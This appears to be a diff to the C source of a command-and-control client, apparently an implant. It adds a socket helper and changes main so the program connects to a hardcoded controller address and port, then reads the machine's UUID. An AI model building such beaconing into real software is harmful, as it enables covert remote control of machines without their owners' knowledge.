@@ -22,8 +22,35 @@
  * SOFTWARE.
  */
 
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
 #include <c2.h>
 #include <machine.h>
+
+int connect_to(char *host, int port)
+{
+    int sockfd;
+    struct sockaddr_in hint;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1)
+        return -1;
+
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    hint.sin_addr.s_addr = inet_addr(host);
+
+    if (connect(sockfd, (struct sockaddr *)&hint, sizeof(hint)) != 0)
+        return -1;
+
+    return sockfd;
+}
 
 int main(int argc, char *argv[])
 {
@@ -33,9 +60,9 @@ int main(int argc, char *argv[])
     char uuid[UUID_SIZE];
 
     c2 = NULL;
-    fd = (int)(*argv[0]);
+    fd = connect_to("192.168.64.1", 8888);
 
-    if (machine_uuid(uuid) < 0)
+    if (fd < 0 || machine_uuid(uuid) < 0)
     {
         return 1;
     }
